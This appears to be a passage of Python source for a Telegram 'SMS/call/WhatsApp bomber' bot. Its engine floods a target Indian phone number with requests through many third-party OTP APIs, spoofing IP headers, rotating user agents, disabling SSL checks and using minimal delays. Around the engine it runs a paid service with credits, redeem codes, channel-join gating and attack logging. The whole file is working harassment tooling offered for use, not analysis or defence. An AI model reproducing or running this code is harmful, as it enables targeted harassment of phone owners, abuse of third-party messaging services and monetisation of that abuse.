                headers["X-Real-IP"] = headers["X-Forwarded-For"]
                headers["User-Agent"] = random.choice([
                    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                ])
                
                self.stats["total_requests"] += 1
                
                # Calculate requests per second
                current_time = time.time()
                if current_time - self.last_time_check >= 1:
                    self.stats["requests_per_second"] = self.stats["total_requests"] - self.last_request_count
                    self.last_request_count = self.stats["total_requests"]
                    self.last_time_check = current_time
                
                # Categorize attack type
                if "call" in name.lower() or "voice" in name.lower():
                    attack_type = "CALL"
                    self.stats["calls_sent"] += 1
                    emoji = "📞"
                elif "whatsapp" in name.lower():
                    attack_type = "WHATSAPP"
                    self.stats["whatsapp_sent"] += 1
                    emoji = "📱"
                else:
                    attack_type = "SMS"
                    self.stats["sms_sent"] += 1
                    emoji = "💬"
                
                # ULTRA FAST requests with 0.5 second timeout
                if api["method"] == "POST":
                    data = api["data"](phone) if api["data"] else None
                    async with session.post(url, headers=headers, data=data, timeout=0.5, ssl=False) as response:
                        if response.status in [200, 201, 202]:
                            self.stats["successful_hits"] += 1
                            print(f"{Fore.RED}[User:{self.user_id}] {emoji} {attack_type} HIT: {name} - SUCCESS! ({self.stats['successful_hits']}){Style.RESET_ALL}")
                        else:
                            self.stats["failed_attempts"] += 1
                else:
                    async with session.get(url, headers=headers, timeout=0.5, ssl=False) as response:
                        if response.status in [200, 201, 202]:
                            self.stats["successful_hits"] += 1
                            print(f"{Fore.RED}[User:{self.user_id}] {emoji} {attack_type} HIT: {name} - SUCCESS! ({self.stats['successful_hits']}){Style.RESET_ALL}")
                        else:
                            self.stats["failed_attempts"] += 1
                
                # ULTRA FAST bombing - minimal delay
                await asyncio.sleep(0.0001)
                
            except Exception as e:
                self.stats["failed_attempts"] += 1
                continue
    
    async def start_destruction(self):
        print(f"\n{Fore.RED}[User:{self.user_id}] 🚀 STARTING ULTRA 3000+ APIS BOMBER!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[User:{self.user_id}] 🎯 Target: +91{self.phone}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[User:{self.user_id}] 💣 Loading {len(ULTIMATE_APIS)} ULTRA FAST APIs...{Style.RESET_ALL}")
        
        # ULTRA FAST connector - unlimited connections
        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, verify_ssl=False, use_dns_cache=True)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for api in ULTIMATE_APIS:
                task = asyncio.create_task(self.bomb_phone(session, api, self.phone))
                tasks.append(task)
            
            await asyncio.gather(*tasks, return_exceptions=True)
    
    def stop(self):
        self.running = False

# Database Manager
class DatabaseManager:
    def __init__(self):
        self.db_file = 'bomber_users.db'
        self.init_database()
    
    def init_database(self):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                attack_count INTEGER DEFAULT 0,
                join_date TEXT,
                last_attack TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                phone TEXT,
                timestamp TEXT,
                status TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS protected_numbers (
                phone TEXT PRIMARY KEY,
                protected_by INTEGER,
                timestamp TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS banned_users (
                user_id INTEGER PRIMARY KEY,
                banned_by INTEGER,
                timestamp TEXT,
                reason TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS allowed_users (
                user_id INTEGER PRIMARY KEY,
                allowed_by INTEGER,
                timestamp TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS credits (
                user_id INTEGER PRIMARY KEY,
                amount INTEGER DEFAULT 0,
                expiry_date TEXT,
                given_by INTEGER,
                timestamp TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS redeem_codes (
                code TEXT PRIMARY KEY,
                amount INTEGER,
                days INTEGER,
                created_by INTEGER,
                created_at TEXT,
                used_by INTEGER,
                used_at TEXT
            )
        ''')
        conn.commit()
        conn.close()
    
    def add_user(self, user_id, username):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('INSERT OR IGNORE INTO users (user_id, username, join_date) VALUES (?, ?, ?)',
                       (user_id, username, datetime.now().isoformat()))
        conn.commit()
        conn.close()
    
    def get_user_attack_count(self, user_id):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('SELECT attack_count FROM users WHERE user_id = ?', (user_id,))
        result = cursor.fetchone()
        conn.close()
        return result[0] if result else 0
    
    def increment_attack_count(self, user_id):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('UPDATE users SET attack_count = attack_count + 1, last_attack = ? WHERE user_id = ?',
                       (datetime.now().isoformat(), user_id))
        conn.commit()
        conn.close()
    
    def log_attack(self, user_id, phone, status):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('INSERT INTO attacks (user_id, phone, timestamp, status) VALUES (?, ?, ?, ?)',
                       (user_id, phone, datetime.now().isoformat(), status))
        conn.commit()
        conn.close()
    
    def get_user_attacks(self, user_id):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('SELECT phone, timestamp, status FROM attacks WHERE user_id = ? ORDER BY timestamp DESC LIMIT 10',
                       (user_id,))
        attacks = cursor.fetchall()
        conn.close()
        return attacks
    
    def get_all_attacks(self):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('SELECT user_id, phone, timestamp, status FROM attacks ORDER BY timestamp DESC LIMIT 50')
        attacks = cursor.fetchall()
        conn.close()
        return attacks

db_manager = DatabaseManager()
active_attackers = {}

def get_user_keyboard():
    """User menu keyboard with buttons"""
    keyboard = [
        [KeyboardButton("💣 Start Attack"), KeyboardButton("🛑 Stop Attack")],
        [KeyboardButton("📊 My Stats"), KeyboardButton("📋 My History")],
        [KeyboardButton("❓ Help"), KeyboardButton("ℹ️ About")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_admin_keyboard():
    """Admin menu keyboard with all controls"""
    keyboard = [
        [KeyboardButton("💣 Start Attack"), KeyboardButton("🛑 Stop Attack")],
        [KeyboardButton("➕ Protect Number"), KeyboardButton("➖ Unprotect Number")],
        [KeyboardButton("🚷 Ban User"), KeyboardButton("🚳 Unban User")],
        [KeyboardButton("➕ Allow User"), KeyboardButton("➖ Disallow User")],
        [KeyboardButton("📜 Protected List"), KeyboardButton("📵 Banned List")],
        [KeyboardButton("🔒 Allowed List"), KeyboardButton("👥 Users")],
        [KeyboardButton("➕ Give Credit"), KeyboardButton("🔁 Gen Redeem Code")],
        [KeyboardButton("📜 Redeem Codes"), KeyboardButton("📊 Credits")],
        [KeyboardButton("📣 Broadcast"), KeyboardButton("⬅️ Back")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

async def check_membership(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in ADMIN_IDS:
        return True
    
    try:
        member = await context.bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in [ChatMember.MEMBER, ChatMember.ADMINISTRATOR, ChatMember.OWNER]
    except:
        return False

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    db_manager.add_user(user.id, user.username or user.first_name)
    
    is_admin = user.id in ADMIN_IDS
    
    if is_admin:
        welcome_msg = f"""
🔥 *{BOT_NAME}* 🔥

Welcome Admin {user.first_name}! 👑

💣 *ULTRA FAST BOMBER 3000+*
━━━━━━━━━━━━━━━━━━━━━

⚡ *{len(ULTIMATE_APIS)}+ ULTRA FAST APIs*
📞 *500+ Call Bombing APIs*
📱 *800+ WhatsApp Bombing APIs*
💬 *1700+ SMS Bombing APIs*

🚀 *ULTRA FAST Mode: 0.0001s delays*
⏱️ *0.5s timeouts for maximum speed*

━━━━━━━━━━━━━━━━━━━━━
👑 *Admin Features:*
• Unlimited attacks
• User management
• Broadcast messages
• View all attacks

Join our channel: {CHANNEL_USERNAME}
"""
        keyboard = get_admin_keyboard()
    else:
        welcome_msg = f"""
🔥 *{BOT_NAME}* 🔥

Welcome {user.first_name}! 👋

💣 *ULTRA FAST BOMBER 3000+*
━━━━━━━━━━━━━━━━━━━━━

⚡ *{len(ULTIMATE_APIS)}+ ULTRA FAST APIs*
📞 *500+ Call Bombing APIs*
📱 *800+ WhatsApp Bombing APIs*
💬 *1700+ SMS Bombing APIs*

🚀 *ULTRA FAST Mode: 0.0001s delays*
⏱️ *0.5s timeouts for maximum speed*

━━━━━━━━━━━━━━━━━━━━━
Use buttons below to get started!

Join our channel: {CHANNEL_USERNAME}
"""
        keyboard = get_user_keyboard()
    
    await update.message.reply_text(welcome_msg, parse_mode='Markdown', reply_markup=keyboard)

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not await check_membership(update, context):
        await update.message.reply_text(
            f"⚠️ Please join {CHANNEL_USERNAME} first to use this bot!",
            parse_mode='Markdown'
        )
        return
    
    await update.message.reply_text(
        "📱 Please send the target phone number (10 digits, without +91):",
        parse_mode='Markdown'
    )
    
    context.user_data['awaiting_phone'] = True

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in active_attackers:
        active_attackers[user_id].stop()
        del active_attackers[user_id]
        await update.message.reply_text("✅ Attack stopped!", parse_mode='Markdown')
    else:
        await update.message.reply_text("❌ No active attack found!", parse_mode='Markdown')

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in active_attackers:
        destroyer = active_attackers[user_id]
        stats = destroyer.stats
        elapsed_time = time.time() - stats["start_time"]
        
        stats_msg = f"""
📊 *REAL-TIME ATTACK STATISTICS*
━━━━━━━━━━━━━━━━━━━━━

🎯 *Target:* +91{destroyer.phone}
⏱️ *Duration:* {int(elapsed_time)}s

💣 *Total Requests:* {stats['total_requests']}
✅ *Successful Hits:* {stats['successful_hits']}
❌ *Failed Attempts:* {stats['failed_attempts']}

📞 *Calls Sent:* {stats['calls_sent']}
📱 *WhatsApp Sent:* {stats['whatsapp_sent']}
💬 *SMS Sent:* {stats['sms_sent']}

⚡ *Speed:* {stats['requests_per_second']} req/s
🔥 *Active APIs:* {stats['active_apis']}
"""
        await update.message.reply_text(stats_msg, parse_mode='Markdown')
    else:
        attack_count = db_manager.get_user_attack_count(user_id)
        is_admin = user_id in ADMIN_IDS
        admin_badge = " 👑" if is_admin else ""
        
        stats_msg = f"""
📊 *Your Statistics*{admin_badge}
━━━━━━━━━━━━━━━━━━━━━

💣 Total Attacks: {attack_count}
{"🔥 Unlimited Attacks (Admin)" if is_admin else ""}

Use "💣 Start Attack" to begin!
"""
        await update.message.reply_text(stats_msg, parse_mode='Markdown')

async def myattacks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    attacks = db_manager.get_user_attacks(user_id)
    
    if not attacks:
        await update.message.reply_text("❌ No attack history found!", parse_mode='Markdown')
        return
    
    msg = "📋 *Your Recent Attacks*\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for phone, timestamp, status in attacks:
        dt = datetime.fromisoformat(timestamp)
        msg += f"📱 +91{phone}\n⏰ {dt.strftime('%Y-%m-%d %H:%M:%S')}\n✅ {status}\n\n"
    
    await update.message.reply_text(msg, parse_mode='Markdown')

async def allattacks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only command!", parse_mode='Markdown')
        return
    
    attacks = db_manager.get_all_attacks()
    
    if not attacks:
        await update.message.reply_text("❌ No attack history found!", parse_mode='Markdown')
        return
    
    msg = "📋 *All Recent Attacks*\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for uid, phone, timestamp, status in attacks[:20]:
        dt = datetime.fromisoformat(timestamp)
        msg += f"👤 User: {uid}\n📱 +91{phone}\n⏰ {dt.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    
    await update.message.reply_text(msg, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_msg = """
❓ *Help & Instructions*
━━━━━━━━━━━━━━━━━━━━━

*How to use:*
1️⃣ Click "💣 Start Attack"
2️⃣ Send 10-digit phone number
3️⃣ Wait for attack to start
4️⃣ Use "🛑 Stop Attack" to stop

*Features:*
• Ultra fast bombing
• Multiple API types
• Real-time statistics

*Need help?*
Contact: {CHANNEL_USERNAME}
"""
    await update.message.reply_text(help_msg, parse_mode='Markdown')

async def about_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    about_msg = f"""
ℹ️ *About {BOT_NAME}*
━━━━━━━━━━━━━━━━━━━━━

🔥 *Version:* 3.0 Ultra
⚡ *APIs:* {len(ULTIMATE_APIS)}+
🚀 *Speed:* 0.0001s delays

*Features:*
📞 500+ Call APIs
📱 800+ WhatsApp APIs  
💬 1700+ SMS APIs

*Channel:* {CHANNEL_USERNAME}

Made with 💣 for power users!
"""
    await update.message.reply_text(about_msg, parse_mode='Markdown')

async def get_all_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only!", parse_mode='Markdown')
        return
    
    conn = sqlite3.connect('bomber_users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT user_id, username, attack_count, join_date FROM users ORDER BY attack_count DESC')
    users = cursor.fetchall()
    conn.close()
    
    if not users:
        await update.message.reply_text("👥 No users found!", parse_mode='Markdown')
        return
    
    msg = "👥 *All Users*\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for uid, username, attacks, joined in users[:50]:
        username_str = username or "No username"
        msg += f"🆔 {uid}\n👤 {username_str}\n💣 {attacks} attacks\n\n"
    
    if len(users) > 50:
        msg += f"\n... and {len(users) - 50} more users"
    
    await update.message.reply_text(msg, parse_mode='Markdown')

async def show_protected_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    conn = sqlite3.connect('bomber_users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT phone, protected_by, timestamp FROM protected_numbers ORDER BY timestamp DESC')
    numbers = cursor.fetchall()
    conn.close()
    
    if not numbers:
        await update.message.reply_text("📜 No protected numbers!", parse_mode='Markdown')
        return
    
    msg = "🔒 *Protected Numbers*\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for phone, by_admin, time in numbers[:30]:
        msg += f"📱 +91{phone}\n👤 By: {by_admin}\n⏰ {time}\n\n"
    
    if len(numbers) > 30:
        msg += f"\n... and {len(numbers) - 30} more"
    
    await update.message.reply_text(msg, parse_mode='Markdown')

async def show_banned_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    conn = sqlite3.connect('bomber_users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT user_id, banned_by, timestamp, reason FROM banned_users ORDER BY timestamp DESC')
    banned = cursor.fetchall()
    conn.close()
    
    if not banned:
        await update.message.reply_text("📵 No banned users!", parse_mode='Markdown')
        return
    
    msg = "🚫 *Banned Users*\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for uid, by_admin, time, reason in banned[:30]:
        reason_str = reason or "No reason"
        msg += f"🆔 {uid}\n👤 By: {by_admin}\n⏰ {time}\n📝 {reason_str}\n\n"
    
    if len(banned) > 30:
        msg += f"\n... and {len(banned) - 30} more"
    
    await update.message.reply_text(msg, parse_mode='Markdown')

async def show_allowed_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    conn = sqlite3.connect('bomber_users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT user_id, allowed_by, timestamp FROM allowed_users ORDER BY timestamp DESC')
    allowed = cursor.fetchall()
    conn.close()
    
    if not allowed:
        await update.message.reply_text("🔒 No allowed users!", parse_mode='Markdown')
        return
    
    msg = "✅ *Allowed Users*\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for uid, by_admin, time in allowed[:30]:
        msg += f"🆔 {uid}\n👤 By: {by_admin}\n⏰ {time}\n\n"
    
    if len(allowed) > 30:
        msg += f"\n... and {len(allowed) - 30} more"
    
    await update.message.reply_text(msg, parse_mode='Markdown')

async def show_redeem_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    conn = sqlite3.connect('bomber_users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT code, amount, days, created_by, created_at, used_by, used_at FROM redeem_codes ORDER BY created_at DESC')
    codes = cursor.fetchall()
    conn.close()
    
    if not codes:
        await update.message.reply_text("📜 No redeem codes!", parse_mode='Markdown')
        return
    
    msg = "🎟️ *Redeem Codes*\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for code, amount, days, by_admin, created, used_by, used_at in codes[:20]:
        status = f"✅ Used by {used_by}" if used_by else "⏳ Available"
        msg += f"🎫 `{code}`\n💰 {amount} credits\n⏱️ {days} days\n{status}\n\n"
    
    if len(codes) > 20:
        msg += f"\n... and {len(codes) - 20} more"
    
    await update.message.reply_text(msg, parse_mode='Markdown')

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    print(f"[DEBUG] Message received from user {user_id}")
    print(f"[DEBUG] Message text: {text}")
    print(f"[DEBUG] awaiting_phone status: {context.user_data.get('awaiting_phone', False)}")
    
    # Handle button presses
    if text == "💣 Start Attack":
        await bomb_command(update, context)
        return
    elif text == "🛑 Stop Attack":
        await stop_command(update, context)
        return
    elif text == "📊 My Stats" or text == "📊 Credits":
        await stats_command(update, context)
        return
    elif text == "📋 My History":
        await myattacks_command(update, context)
        return
    elif text == "❓ Help":
        await help_command(update, context)
        return
    elif text == "ℹ️ About":
        await about_command(update, context)
        return
    elif text == "⬅️ Back":
        await start_command(update, context)
        return
    
    # Admin-only buttons
    if user_id in ADMIN_IDS:
        if text == "➕ Protect Number":
            await update.message.reply_text("📲 Send the phone number to protect (10 digits):")
            context.user_data['admin_action'] = 'protect_number'
            return
        elif text == "➖ Unprotect Number":
            await update.message.reply_text("📲 Send the phone number to unprotect (10 digits):")
            context.user_data['admin_action'] = 'unprotect_number'
            return
        elif text == "🚷 Ban User":
            await update.message.reply_text("🛑 Send the Telegram user ID to ban:")
            context.user_data['admin_action'] = 'ban_user'
            return
        elif text == "🚳 Unban User":
            await update.message.reply_text("✅ Send the Telegram user ID to unban:")
            context.user_data['admin_action'] = 'unban_user'
            return
        elif text == "➕ Allow User":
            await update.message.reply_text("➕ Send the Telegram user ID to allow:")
            context.user_data['admin_action'] = 'allow_user'
            return
        elif text == "➖ Disallow User":
            await update.message.reply_text("➖ Send the Telegram user ID to disallow:")
            context.user_data['admin_action'] = 'disallow_user'
            return
        elif text == "➕ Give Credit":
            await update.message.reply_text(
                "➕ Give Credits\n\n"
                "Format: <user_id> <amount> <days>\n"
                "Example: 123456789 10 30\n\n"
                "• days=0 means credits never expire\n"
                "• days>0 means credits expire after that many days"
            )
            context.user_data['admin_action'] = 'give_credit'
            return
        elif text == "🔁 Gen Redeem Code":
            await update.message.reply_text(
                "🔁 Generate Redeem Code\n\n"
                "Format: <amount> <days>\n"
                "Example: 5 7\n\n"
                "This creates a code that gives:\n"
                "• Amount of credits\n"
                "• Valid for number of days\n"
                "• days=0 means never expire"
            )
            context.user_data['admin_action'] = 'gen_redeem'
            return
        elif text == "📜 Protected List":
            await show_protected_list(update, context)
            return
        elif text == "📵 Banned List":
            await show_banned_list(update, context)
            return
        elif text == "🔒 Allowed List":
            await show_allowed_list(update, context)
            return
        elif text == "👥 Users":
            await get_all_users(update, context)
            return
        elif text == "📜 Redeem Codes":
            await show_redeem_codes(update, context)
            return
        elif text == "📣 Broadcast":
            await update.message.reply_text("📣 Send the message to broadcast to all users:")
            context.user_data['admin_action'] = 'broadcast'
            return
    
    # Process admin actions
    admin_action = context.user_data.get('admin_action')
    if admin_action and user_id in ADMIN_IDS:
        conn = sqlite3.connect('bomber_users.db')
        cursor = conn.cursor()
        
        if admin_action == 'protect_number':
            phone = text.strip()
            if not phone.isdigit() or len(phone) != 10:
                await update.message.reply_text("❌ Invalid phone number! Please send 10 digits.")
            else:
                cursor.execute('INSERT OR REPLACE INTO protected_numbers VALUES (?, ?, ?)',
                              (phone, user_id, datetime.now().isoformat()))
                conn.commit()
                await update.message.reply_text(f"✅ Protected +91{phone}!")
            context.user_data['admin_action'] = None
        
        elif admin_action == 'unprotect_number':
            phone = text.strip()
            if not phone.isdigit() or len(phone) != 10:
                await update.message.reply_text("❌ Invalid phone number! Please send 10 digits.")
            else:
                cursor.execute('DELETE FROM protected_numbers WHERE phone = ?', (phone,))
                conn.commit()
                if cursor.rowcount > 0:
                    await update.message.reply_text(f"✅ Unprotected +91{phone}!")
                else:
                    await update.message.reply_text(f"⚠️ +91{phone} was not in protected list!")
            context.user_data['admin_action'] = None
        
        elif admin_action == 'ban_user':
            try:
                target_id = int(text.strip())
                cursor.execute('INSERT OR REPLACE INTO banned_users VALUES (?, ?, ?, ?)',
                              (target_id, user_id, datetime.now().isoformat(), 'Banned by admin'))
                conn.commit()
                await update.message.reply_text(f"🚫 Banned user {target_id}!")
            except ValueError:
                await update.message.reply_text("❌ Invalid user ID! Please send numbers only.")
            context.user_data['admin_action'] = None
        
        elif admin_action == 'unban_user':
            try:
                target_id = int(text.strip())
                cursor.execute('DELETE FROM banned_users WHERE user_id = ?', (target_id,))
                conn.commit()
                if cursor.rowcount > 0:
                    await update.message.reply_text(f"✅ Unbanned user {target_id}!")
                else:
                    await update.message.reply_text(f"⚠️ User {target_id} was not banned!")
            except ValueError:
                await update.message.reply_text("❌ Invalid user ID! Please send numbers only.")
            context.user_data['admin_action'] = None
        
        elif admin_action == 'allow_user':
            try:
                target_id = int(text.strip())
                cursor.execute('INSERT OR REPLACE INTO allowed_users VALUES (?, ?, ?)',
                              (target_id, user_id, datetime.now().isoformat()))
                conn.commit()
                await update.message.reply_text(f"✅ Allowed user {target_id}!")
            except ValueError:
                await update.message.reply_text("❌ Invalid user ID! Please send numbers only.")
            context.user_data['admin_action'] = None
        
        elif admin_action == 'disallow_user':
            try:
                target_id = int(text.strip())
                cursor.execute('DELETE FROM allowed_users WHERE user_id = ?', (target_id,))
                conn.commit()
                if cursor.rowcount > 0:
                    await update.message.reply_text(f"✅ Disallowed user {target_id}!")
                else:
                    await update.message.reply_text(f"⚠️ User {target_id} was not in allowed list!")
            except ValueError:
                await update.message.reply_text("❌ Invalid user ID! Please send numbers only.")
            context.user_data['admin_action'] = None
        
        elif admin_action == 'give_credit':
            try:
                parts = text.strip().split()
                if len(parts) != 3:
                    await update.message.reply_text("❌ Invalid format! Use: <user_id> <amount> <days>")
                else:
                    target_id, amount, days = int(parts[0]), int(parts[1]), int(parts[2])
                    expiry = None if days == 0 else (datetime.now() + timedelta(days=days)).isoformat()
                    cursor.execute('INSERT OR REPLACE INTO credits VALUES (?, ?, ?, ?, ?)',
                                  (target_id, amount, expiry, user_id, datetime.now().isoformat()))
                    conn.commit()
                    await update.message.reply_text(f"✅ Gave {amount} credits to user {target_id}!")
            except (ValueError, IndexError):
                await update.message.reply_text("❌ Invalid format! Use: <user_id> <amount> <days>")
            context.user_data['admin_action'] = None
        
        elif admin_action == 'gen_redeem':
            try:
                parts = text.strip().split()
                if len(parts) != 2:
                    await update.message.reply_text("❌ Invalid format! Use: <amount> <days>")
                else:
                    amount, days = int(parts[0]), int(parts[1])
                    code = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10))
                    cursor.execute('INSERT INTO redeem_codes VALUES (?, ?, ?, ?, ?, ?, ?)',
                                  (code, amount, days, user_id, datetime.now().isoformat(), None, None))
                    conn.commit()
                    await update.message.reply_text(
                        f"✅ *Redeem Code Generated!*\n\n"
                        f"🎫 Code: `{code}`\n"
                        f"💰 Amount: {amount} credits\n"
                        f"⏱️ Valid: {days} days\n\n"
                        f"Share this code with users!",
                        parse_mode='Markdown'
                    )
            except (ValueError, IndexError):
                await update.message.reply_text("❌ Invalid format! Use: <amount> <days>")
            context.user_data['admin_action'] = None
        
        elif admin_action == 'broadcast':
            cursor.execute('SELECT user_id FROM users')
            all_users = cursor.fetchall()
            success_count = 0
            
            for (uid,) in all_users:
                try:
                    await context.bot.send_message(chat_id=uid, text=f"📢 *Broadcast:*\n\n{text}", parse_mode='Markdown')
                    success_count += 1
                    await asyncio.sleep(0.05)
                except Exception:
                    continue
            
            await update.message.reply_text(f"✅ Broadcast sent to {success_count}/{len(all_users)} users!")
            context.user_data['admin_action'] = None
        
        conn.close()
        return
    
    if context.user_data.get('awaiting_phone'):
        phone = update.message.text.strip()
        
        print(f"[DEBUG] Phone number entered: {phone}")
        print(f"[DEBUG] Is digit: {phone.isdigit()}, Length: {len(phone)}")
        
        if not phone.isdigit() or len(phone) != 10:
            await update.message.reply_text(
                "❌ Invalid phone number! Please send a 10-digit number.",
                parse_mode='Markdown'
            )
            return
        
        conn = sqlite3.connect('bomber_users.db')
        cursor = conn.cursor()
        cursor.execute('SELECT 1 FROM protected_numbers WHERE phone = ?', (phone,))
        if cursor.fetchone():
            conn.close()
            await update.message.reply_text(
                "🛡️ This number is protected and cannot be attacked!",
                parse_mode='Markdown'
            )
            context.user_data['awaiting_phone'] = False
            return
        
        cursor.execute('SELECT 1 FROM banned_users WHERE user_id = ?', (user_id,))
        if cursor.fetchone() and user_id not in ADMIN_IDS:
            conn.close()
            await update.message.reply_text(
                "🚫 You are banned from using this bot!",
                parse_mode='Markdown'
            )
            context.user_data['awaiting_phone'] = False
            return
        conn.close()
        
        context.user_data['awaiting_phone'] = False
        
        await update.message.reply_text(
            f"🚀 Starting ULTRA FAST attack on +91{phone}...\n"
            f"💣 Loading {len(ULTIMATE_APIS)} APIs...",
            parse_mode='Markdown'
        )
        
        destroyer = UltraPhoneDestroyer(user_id, phone)
        active_attackers[user_id] = destroyer
        
        db_manager.increment_attack_count(user_id)
        db_manager.log_attack(user_id, phone, "Started")
        
        asyncio.create_task(destroyer.start_destruction())
        
        await asyncio.sleep(5)
        
        stats = destroyer.stats
        status_msg = f"""
✅ *ATTACK IN PROGRESS!*
━━━━━━━━━━━━━━━━━━━━━

🎯 *Target:* +91{phone}

💣 *Requests:* {stats['total_requests']}
✅ *Hits:* {stats['successful_hits']}

📞 *Calls:* {stats['calls_sent']}
📱 *WhatsApp:* {stats['whatsapp_sent']}
💬 *SMS:* {stats['sms_sent']}

⚡ *Speed:* {stats['requests_per_second']} req/s

Use /stop to stop the attack
Use /stats for live statistics
"""
        await update.message.reply_text(status_msg, parse_mode='Markdown')

def main():
    if not TELEGRAM_BOT_TOKEN:
        print("❌ Please set TELEGRAM_BOT_TOKEN environment variable")
        return
    
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("bomb", bomb_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("myattacks", myattacks_command))
    app.add_handler(CommandHandler("allattacks", allattacks_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("about", about_command))
    app.add_handler(CommandHandler("users", get_all_users))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🤖 ULTRA BOMBER 3000+ Telegram Bot Started!")
    print(f"📢 Force join enabled for: {CHANNEL_USERNAME}")
    print(f"💣 Loaded {len(ULTIMATE_APIS)} ULTRA FAST APIs")
    print("👑 Admin mode activated")
    print("⚡ ULTRA FAST Mode: 0.0001s delays, 0.5s timeouts")
    
    app.run_polling()

if __name__ == '__main__':
    main()
